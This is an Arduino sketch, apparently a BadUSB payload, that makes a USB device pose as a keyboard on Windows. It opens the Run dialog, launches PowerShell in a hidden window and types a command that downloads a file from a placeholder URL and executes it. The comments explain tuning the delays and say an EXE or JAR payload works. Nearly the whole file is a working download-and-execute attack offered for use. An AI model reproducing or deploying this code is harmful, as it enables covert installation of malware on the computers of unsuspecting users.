#include <Keyboard.h> 
/*
 * Developer @root_haxor !
 */

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  // Change this value depending on the computer you are using ( i mean slow or not )
  delay(100);

  Keyboard.print("powershell -windowstyle hidden");

  typeKey(KEY_RETURN);

  // the shell usually takes a few  seconds to fully run so i put a delay just in case .
  delay(1000);

  // I just wanted to note that the file can be an EXE or JAR file doesn't really matter.
  // in the destination if you put the fileName only, the file will be saved under C:\Users\LoggedInUser
  Keyboard.print("$source = \"url of file\"; $destination = \"path/filename\"; Invoke-WebRequest $source -OutFile $destination; Start-Process $destination\"\"");

  typeKey(KEY_RETURN);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
